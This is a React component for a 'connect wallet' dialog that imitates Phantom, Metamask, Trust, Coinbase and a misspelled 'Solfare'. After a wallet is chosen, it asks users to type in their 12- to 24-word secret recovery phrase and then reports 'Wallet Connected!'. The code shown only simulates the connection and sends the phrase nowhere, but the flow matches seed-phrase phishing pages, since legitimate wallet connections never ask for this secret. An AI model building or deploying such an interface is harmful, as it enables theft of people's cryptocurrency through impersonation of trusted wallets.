
import { Dialog, DialogContent } from "./ui/dialog";
import { Sheet, SheetContent } from "./ui/sheet";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { useIsMobile } from "@/hooks/use-mobile";
import { useState } from "react";
import { GlobeIcon, ArrowLeftIcon, LockIcon, AlertCircleIcon, CheckCircle2Icon } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface WalletOption {
  id: string;
  name: string;
  icon: JSX.Element;
}

const walletOptions: WalletOption[] = [
  {
    id: "phantom",
    name: "Phantom Wallet",
    icon: <div className="bg-purple-100 rounded-lg p-1.5 text-purple-600">
      <svg width="20" height="20" viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M103.1 67.6c0-8.6-6.3-15.8-14.8-17v34.2c8.5-1.3 14.8-8.4 14.8-17.2z" fill="#8A63D2"></path>
        <path d="M8 41.3v14.1l8.2.9v-24z" fill="#9D82DE"></path>
        <path d="M64 2C29.8 2 2 29.8 2 64c0 4.3.5 8.5 1.2 12.6h37.5c7.8 0 14.1 6.3 14.1 14.1v2.8h18.5v-2.8c0-7.8 6.3-14.1 14.1-14.1h37.4c.9-4.1 1.2-8.3 1.2-12.6 0-34.2-27.8-62-62-62z" fill="#9D82DE"></path>
        <path d="M88.3 50.6H74.5V35c0-2.8-2.3-5-5-5H58.5c-2.8 0-5.1 2.2-5.1 5v15.6H39.6c-2.8 0-5 2.3-5 5v11c0 2.8 2.2 5 5 5h13.8v15.6c0 2.7 2.3 5 5.1 5h11c2.7 0 5-2.3 5-5V66.6h13.8c2.7 0 5-2.2 5-5v-11c0-2.7-2.3-5-5-5z" fill="#8A63D2"></path>
      </svg>
    </div>
  },
  {
    id: "solfare",
    name: "Solfare",
    icon: <div className="bg-orange-100 rounded-lg p-1.5 text-orange-500">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12z" fill="#FE9D0B"></path>
        <path d="M7.04 10.86c.056-.097.167-.158.284-.158h12.354c.175 0 .262.211.139.335L16.29 14.564a.33.33 0 01-.233.097H3.703a.195.195 0 01-.167-.292l3.503-3.509zm.233 6.005h12.354a.297.297 0 00.284-.158l3.503-3.509a.195.195 0 00-.167-.292H10.893a.33.33 0 00-.233.097l-3.527 3.527c-.123.124-.36.335.14.335zM19.817 7.13a.297.297 0 00-.284-.159H7.18a.195.195 0 00-.139.335l3.527 3.527c.056.063.144.097.233.097h12.354c.175 0 .262-.211.14-.335L19.816 7.13z" fill="#fff"></path>
      </svg>
    </div>
  },
  {
    id: "metamask",
    name: "Metamask",
    icon: <div className="bg-orange-100 rounded-lg p-1.5 text-orange-600">
      <svg width="20" height="20" viewBox="0 0 212 189" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M61.4 35.6L105.1 0l43 35.6-25.5 42.6-36.7-42.6z" fill="#E17726"></path>
        <path d="M202.3 139.5l9.7-40.5-33.4-3 5.3 72.4 18.4-28.8z" fill="#E27625"></path>
        <path d="M0 98.9l9.7 40.6 18.5 28.8 5.2-72.4-33.4 3z" fill="#E27625"></path>
        <path d="M56.4 59.8l-8.9 33.4L106 97l-19-42.8-30.7 5.6z" fill="#E27625"></path>
        <path d="M155.6 59.8l-31-6.2L105 97l58.4-3.7-7.9-33.5z" fill="#E27625"></path>
        <path d="M66.6 168.1l41.1-11.2-6.2-21.2-34.9 32.4z" fill="#E27625"></path>
        <path d="M104.3 156.9l41.1 11.2v-32.4l-34.9-21.2-6.2 42.4z" fill="#E27625"></path>
      </svg>
    </div>
  },
  {
    id: "trust",
    name: "Trust Wallet",
    icon: <div className="bg-blue-100 rounded-lg p-1.5 text-blue-600">
      <svg width="20" height="20" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M512 60.4l362.2 155.3v289c0 153.8-94.8 297.3-241.4 353.4L512 909.6 390.7 858C244.7 801.9 149.8 658.4 149.8 504.6v-289L512 60.4zm0 43.4L193.2 241.1v263.5c0 139.6 84 269.5 213.7 322.5L512 866l104-39.3c130.2-53 214.8-182.9 214.8-322.5V241.1L512 103.8z" fill="#0984FE"></path>
        <path d="M511 297.4c71.3 0 129.1 57.8 129.1 129.1 0 51.5-30.1 95.9-73.8 116.6v89.7H455.7v-89.7c-43.6-20.7-73.8-65.1-73.8-116.6 0-71.3 57.8-129.1 129.1-129.1zm75.8 304.6c5.4 0 9.7 4.3 9.7 9.7v80.6c0 5.4-4.3 9.7-9.7 9.7H434.8c-5.4 0-9.7-4.3-9.7-9.7v-80.6c0-5.4 4.3-9.7 9.7-9.7h152z" fill="#0984FE"></path>
      </svg>
    </div>
  },
  {
    id: "coinbase",
    name: "Coinbase Wallet",
    icon: <div className="bg-blue-100 rounded-lg p-1.5 text-blue-600">
      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M256 0C114.8 0 0 114.8 0 256s114.8 256 256 256 256-114.8 256-256S397.2 0 256 0z" fill="#0052FF"></path>
        <path d="M256 128c-70.7 0-128 57.3-128 128s57.3 128 128 128 128-57.3 128-128-57.3-128-128-128zm0 206.8c-43.7 0-79.2-35.5-79.2-79.2S212.3 176.4 256 176.4s79.2 35.5 79.2 79.2-35.5 79.2-79.2 79.2z" fill="white"></path>
      </svg>
    </div>
  }
];

type WalletStep = 'selection' | 'phrase' | 'connecting' | 'success' | 'error';

interface WalletDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  serviceName: string;
}

export function WalletDialog({ open, onOpenChange, serviceName }: WalletDialogProps) {
  const isMobile = useIsMobile();
  const [searchQuery, setSearchQuery] = useState("");
  const [currentStep, setCurrentStep] = useState<WalletStep>('selection');
  const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(null);
  const [phrase, setPhrase] = useState("");
  const [isImporting, setIsImporting] = useState(false);
  const { toast } = useToast();
  
  const filteredWallets = walletOptions.filter(wallet => 
    wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const handleWalletSelect = (wallet: WalletOption) => {
    setSelectedWallet(wallet);
    setCurrentStep('phrase');
  };

  const handleBack = () => {
    if (currentStep === 'phrase') {
      setCurrentStep('selection');
      setSelectedWallet(null);
    } else if (currentStep === 'error' || currentStep === 'success') {
      setCurrentStep('selection');
      setSelectedWallet(null);
    }
  };

  const handlePhraseSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phrase) {
      toast({
        title: "Error",
        description: "Please enter your recovery phrase",
        variant: "destructive",
      });
      return;
    }

    setIsImporting(true);
    setCurrentStep('connecting');
    
    // Simulate connection delay
    setTimeout(() => {
      if (phrase.length < 12) {
        // Simulate error for demo
        setCurrentStep('error');
      } else {
        // Simulate success for demo
        setCurrentStep('success');
      }
      setIsImporting(false);
    }, 2000);
  };

  const handleCloseDialog = () => {
    // Reset state on close
    setCurrentStep('selection');
    setSelectedWallet(null);
    setPhrase("");
    onOpenChange(false);
  };

  const renderSelectionStep = () => (
    <>
      <div className="mb-4 space-y-4">
        <div className="flex space-x-3">
          <button
            className="px-4 py-2 text-sm rounded-full bg-gray-900 text-white"
          >
            Recover
          </button>
          <button
            className="px-4 py-2 text-sm rounded-full bg-transparent border border-gray-300"
          >
            Manual Connect
          </button>
        </div>
        
        <div className="relative">
          <Input
            placeholder="Search wallets..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full bg-gray-100 border-gray-200"
          />
        </div>
      </div>
      
      <div className="space-y-2 max-h-64 overflow-y-auto pr-2">
        {filteredWallets.map((wallet) => (
          <div 
            key={wallet.id}
            className="flex items-center p-3 bg-white hover:bg-gray-50 rounded-lg cursor-pointer transition-colors"
            onClick={() => handleWalletSelect(wallet)}
          >
            {wallet.icon}
            <span className="ml-3">{wallet.name}</span>
          </div>
        ))}
      </div>
      
      <div className="mt-6 flex flex-col items-center justify-center">
        <div className="p-4 bg-gray-50 w-full rounded-lg flex flex-col items-center justify-center">
          <div className="w-12 h-12 mb-3 bg-gray-100 rounded-full flex items-center justify-center">
            <GlobeIcon className="text-gray-400" size={24} />
          </div>
          <p className="text-center text-gray-600 text-sm">Connect your wallet to get started</p>
        </div>
      </div>
    </>
  );

  const renderPhraseStep = () => (
    <>
      <div className="mb-4">
        <button 
          onClick={handleBack}
          className="flex items-center text-gray-600 hover:text-gray-900 transition-colors"
        >
          <ArrowLeftIcon className="w-4 h-4 mr-1" />
          <span>Back</span>
        </button>
      </div>

      <div className="flex items-center justify-center mb-6">
        {selectedWallet?.icon}
        <h3 className="text-lg font-medium ml-2">{selectedWallet?.name}</h3>
      </div>

      <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
        <div className="flex items-start">
          <AlertCircleIcon className="text-yellow-500 w-5 h-5 mt-0.5 mr-2" />
          <p className="text-sm text-yellow-700">
            Enter your recovery phrase to import your existing wallet. Be careful, never share your recovery phrase with anyone.
          </p>
        </div>
      </div>

      <form onSubmit={handlePhraseSubmit}>
        <div className="mb-4">
          <label htmlFor="recovery-phrase" className="text-sm font-medium text-gray-700 mb-1 block">
            Secret Recovery Phrase
          </label>
          <textarea
            id="recovery-phrase"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            className="w-full h-24 p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-wallet-blue focus:border-transparent"
            placeholder="Enter your 12, 18, or 24-word recovery phrase, words separated by spaces"
          />
          <p className="text-xs text-gray-500 mt-1">
            Typically 12 (or 24) words separated by single spaces
          </p>
        </div>

        <Button 
          type="submit" 
          className="w-full py-2 bg-wallet-blue hover:bg-opacity-90 transition-colors"
          disabled={isImporting}
        >
          {isImporting ? "Importing..." : "Import Wallet"}
        </Button>
      </form>
    </>
  );

  const renderConnectingStep = () => (
    <div className="flex flex-col items-center justify-center py-8">
      <div className="w-16 h-16 rounded-full border-4 border-t-wallet-blue border-gray-200 animate-spin mb-6"></div>
      <h3 className="text-lg font-medium mb-2">Connecting to {selectedWallet?.name}</h3>
      <p className="text-gray-500 text-sm">Please wait while we establish the connection...</p>
    </div>
  );

  const renderSuccessStep = () => (
    <div className="flex flex-col items-center justify-center py-8">
      <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mb-6">
        <CheckCircle2Icon className="text-green-500 w-8 h-8" />
      </div>
      <h3 className="text-lg font-medium mb-2">Wallet Connected!</h3>
      <p className="text-gray-500 text-sm text-center mb-6">Your {selectedWallet?.name} has been successfully connected.</p>
      <Button 
        onClick={handleCloseDialog}
        className="bg-wallet-blue hover:bg-opacity-90 transition-colors"
      >
        Continue to {serviceName}
      </Button>
    </div>
  );

  const renderErrorStep = () => (
    <div className="flex flex-col items-center justify-center py-8">
      <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center mb-6">
        <AlertCircleIcon className="text-red-500 w-8 h-8" />
      </div>
      <h3 className="text-lg font-medium mb-2">Connection Failed</h3>
      <p className="text-gray-500 text-sm text-center mb-2">We couldn't connect to your wallet.</p>
      <p className="text-gray-500 text-sm text-center mb-6">Please verify your recovery phrase and try again.</p>
      <div className="flex space-x-4">
        <Button 
          onClick={handleBack}
          variant="outline"
          className="border border-gray-300"
        >
          Try Again
        </Button>
        <Button 
          onClick={() => setCurrentStep('phrase')}
          className="bg-wallet-blue hover:bg-opacity-90 transition-colors"
        >
          Edit Phrase
        </Button>
      </div>
    </div>
  );

  const renderContent = () => {
    switch(currentStep) {
      case 'selection':
        return renderSelectionStep();
      case 'phrase':
        return renderPhraseStep();
      case 'connecting':
        return renderConnectingStep();
      case 'success':
        return renderSuccessStep();
      case 'error':
        return renderErrorStep();
      default:
        return renderSelectionStep();
    }
  };

  const renderTitle = () => {
    switch(currentStep) {
      case 'selection':
        return (
          <>
            <h3 className="text-lg font-semibold">{serviceName}</h3>
            <p className="text-sm text-gray-500">Select a wallet to continue</p>
          </>
        );
      case 'phrase':
        return (
          <>
            <h3 className="text-lg font-semibold">Import Wallet</h3>
            <p className="text-sm text-gray-500">Enter your recovery phrase</p>
          </>
        );
      case 'connecting':
        return null;
      case 'success':
        return null;
      case 'error':
        return null;
      default:
        return (
          <>
            <h3 className="text-lg font-semibold">{serviceName}</h3>
            <p className="text-sm text-gray-500">Select a wallet to continue</p>
          </>
        );
    }
  };

  if (isMobile) {
    return (
      <Sheet open={open} onOpenChange={handleCloseDialog}>
        <SheetContent className="px-4">
          {currentStep !== 'connecting' && currentStep !== 'success' && currentStep !== 'error' && (
            <div className="py-4">
              {renderTitle()}
            </div>
          )}
          {renderContent()}
        </SheetContent>
      </Sheet>
    );
  }

  return (
    <Dialog open={open} onOpenChange={handleCloseDialog}>
      <DialogContent className="sm:max-w-md">
        {currentStep !== 'connecting' && currentStep !== 'success' && currentStep !== 'error' && (
          <div className="py-4">
            {renderTitle()}
          </div>
        )}
        {renderContent()}
      </DialogContent>
    </Dialog>
  );
}
